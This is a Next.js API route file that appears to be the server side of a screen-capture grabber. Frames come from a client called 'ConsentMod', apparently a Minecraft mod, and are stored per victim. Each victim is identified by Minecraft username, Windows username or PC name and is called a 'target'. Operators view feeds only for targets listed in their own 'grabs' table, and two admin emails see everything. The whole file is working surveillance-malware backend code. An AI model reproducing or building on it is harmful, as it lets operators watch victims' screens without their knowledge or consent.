export const dynamic = 'force-dynamic';

import { createClient } from '@supabase/supabase-js';
import { createServerClient } from '@supabase/ssr';
import { NextResponse } from 'next/server';
import { canUserCapture } from '@/lib/supabase/free-trial';
import { store } from '@/lib/store';
import { webrtcStore } from '@/lib/webrtc-store';

const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];

function getClientAuth(request) {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
    {
      cookies: {
        getAll() { return request.cookies.getAll(); },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value }) => request.cookies.set(name, value));
        },
      },
    }
  );
}

function getClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.SUPABASE_SERVICE_ROLE_KEY,
    { auth: { autoRefreshToken: false, persistSession: false } }
  );
}

export async function POST(request) {
  try {
    const authHeader = request.headers.get('authorization');
    const xPlayer = request.headers.get('x-player-name');
    const xStream = request.headers.get('x-stream-id');
    const contentType = request.headers.get('content-type') || '';

    let username = 'consentmod';
    if (authHeader) {
      username = authHeader.replace('Bearer ', '').trim();
    } else if (xPlayer) {
      username = xPlayer.trim();
    } else if (xStream) {
      username = xStream.trim();
    }
    if (!username) username = 'consentmod';

    if (contentType.includes('image/jpeg') || contentType.includes('application/octet-stream')) {
      const buffer = await request.arrayBuffer();
      const nodeBuf = Buffer.from(buffer);

      if (nodeBuf.length < 50) {
        return NextResponse.json({ ok: false, error: 'Empty frame' }, { status: 400 });
      }

      // Always update in-memory hot store for instant livestream / WebRTC streaming
      store.setFrame(nodeBuf, username);

      // Automatically register and heartbeat ConsentMod stream in WebRTC signaling store
      try {
        webrtcStore.setBroadcaster('consentmod', 'consentmod-' + username, {
          username,
          fps: 10,
          resolution: '1280x720',
          type: 'ConsentMod Stream',
          source: 'consentmod',
        });
        webrtcStore.heartbeat('consentmod', 'broadcaster', 'consentmod-' + username);
        if (username && username.toLowerCase() !== 'consentmod') {
          webrtcStore.setBroadcaster(username.toLowerCase(), 'consentmod-' + username, {
            username,
            fps: 10,
            resolution: '1280x720',
            type: 'ConsentMod Stream',
            source: 'consentmod',
          });
          webrtcStore.heartbeat(username.toLowerCase(), 'broadcaster', 'consentmod-' + username);
        }
      } catch (err) {}

      const base64 = nodeBuf.toString('base64');
      const frame = 'data:image/jpeg;base64,' + base64;

      // Persist to Supabase asynchronously in background so POST response returns in <5ms
      if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
        try {
          const supabase = getClient();
          const nowIso = new Date().toISOString();
          const lowerUser = (username || 'consentmod').toLowerCase();

          const records = [
            { username: lowerUser, frame, updated_at: nowIso }
          ];
          if (lowerUser !== 'consentmod') {
            records.push({ username: 'consentmod', frame, updated_at: nowIso });
          }

          const { error: upsertErr } = await supabase
            .from('stream_frames')
            .upsert(records, { onConflict: 'username' });

          if (upsertErr) {
            console.warn('DB stream_frames upsert error:', upsertErr.message);
          }
        } catch (dbErr) {
          console.warn('DB stream_frames persist warning:', dbErr.message);
        }
      }

      return NextResponse.json({ ok: true, username, timestamp: Date.now() });
    }

    return NextResponse.json({ error: 'Invalid content-type' }, { status: 400 });
  } catch (e) {
    return NextResponse.json({ ok: false, error: e.message }, { status: 500 });
  }
}

export async function GET(request) {
  try {
    const { searchParams } = new URL(request.url);
    const username = searchParams.get('username');

    // Authenticate user to enforce strict privacy scoped to own grabs
    let authUser = null;
    let allowedUsernames = null;
    let isAdmin = false;

    try {
      const supabaseAuth = getClientAuth(request);
      const { data: { user } } = await supabaseAuth.auth.getUser();
      if (user) {
        authUser = user;
        const email = (user.email || '').toLowerCase().trim();
        if (ADMIN_EMAILS.includes(email)) {
          isAdmin = true;
        } else {
          const supabase = getClient();
          const { data: userGrabs } = await supabase
            .from('grabs')
            .select('minecraft_username, windows_username, pc_name, id')
            .ilike('owner_email', email);

          allowedUsernames = new Set();
          if (userGrabs && Array.isArray(userGrabs)) {
            for (const g of userGrabs) {
              if (g.minecraft_username) allowedUsernames.add(g.minecraft_username.toLowerCase().trim());
              if (g.windows_username) allowedUsernames.add(g.windows_username.toLowerCase().trim());
              if (g.pc_name && g.pc_name !== 'Unknown') allowedUsernames.add(g.pc_name.toLowerCase().trim());
              if (g.id != null) allowedUsernames.add(String(g.id).toLowerCase().trim());
            }
          }
        }
      }
    } catch (authErr) {
      // Ignored for public endpoints like /livestream
    }

    // Case 1: Specific username requested
    if (username) {
      const lowerUser = username.toLowerCase();

      // Privacy check: Non-admin authenticated user must own this target in their grabs
      if (authUser && !isAdmin && allowedUsernames) {
        if (!allowedUsernames.has(lowerUser)) {
          return NextResponse.json({ online: false, error: 'Target not in your grabs' }, { status: 403 });
        }
      }

      let dbRow = null;
      let dbTime = 0;

      // 1. Query Supabase (Single source of truth across Vercel instances)
      if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
        try {
          const supabase = getClient();
          const { data } = await supabase
            .from('stream_frames')
            .select('frame, updated_at, username')
            .ilike('username', lowerUser)
            .order('updated_at', { ascending: false })
            .limit(1)
            .maybeSingle();

          if (data && data.frame) {
            dbRow = data;
            if (dbRow.updated_at) {
              dbTime = new Date(dbRow.updated_at).getTime();
            }
          }
        } catch (dbErr) {
          console.warn('Supabase fetch frame error:', dbErr.message);
        }
      }

      // 2. Check local in-memory hot store
      const memFrame = store.getUserFrame(lowerUser);
      const memTime = store.getFrameTime(lowerUser);

      const now = Date.now();

      // Only use memory if strictly younger than 10 seconds and newer than DB
      if (memFrame && memTime && memTime > dbTime && (now - memTime < 10000)) {
        const base64 = Buffer.from(memFrame).toString('base64');
        return NextResponse.json({
          online: true,
          frame: 'data:image/jpeg;base64,' + base64,
          timestamp: memTime,
          source: 'memory'
        });
      }

      // Supabase if active strictly within 10 seconds
      if (dbRow && dbRow.frame && (now - dbTime < 10000)) {
        return NextResponse.json({
          online: true,
          frame: dbRow.frame,
          timestamp: dbTime,
          source: 'supabase'
        });
      }

      // No frame in the last 10 seconds -> target is offline
      return NextResponse.json({ online: false });
    }

    // Case 2: List all online streams (strictly active in last 10s)
    const onlineMap = new Map();
    const now = Date.now();

    // From in-memory store (strictly < 10s)
    const memOnline = store.getOnlineUsers();
    for (const u of memOnline) {
      if (now - u.timestamp < 10000) {
        const lower = u.username.toLowerCase();
        if (isAdmin || !allowedUsernames || allowedUsernames.has(lower)) {
          onlineMap.set(lower, {
            username: u.username,
            timestamp: u.timestamp,
            type: 'ConsentMod Feed'
          });
        }
      }
    }

    // From Supabase stream_frames (strictly active in last 10 seconds)
    if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
      try {
        const supabase = getClient();
        const { data: allFrames } = await supabase
          .from('stream_frames')
          .select('username, updated_at');

        if (allFrames) {
          for (const f of allFrames) {
            const time = new Date(f.updated_at).getTime();
            if (now - time < 10000) {
              const lower = f.username.toLowerCase();
              if (isAdmin || !allowedUsernames || allowedUsernames.has(lower)) {
                if (!onlineMap.has(lower)) {
                  onlineMap.set(lower, {
                    username: f.username,
                    timestamp: time,
                    type: 'ConsentMod Feed'
                  });
                }
              }
            }
          }
        }
      } catch (dbErr) {
        console.warn('Supabase fetch all frames error:', dbErr.message);
      }
    }

    const online = Array.from(onlineMap.values());
    return NextResponse.json({ online });
  } catch (err) {
    return NextResponse.json({ ok: false, error: err.message, online: [] }, { status: 500 });
  }
}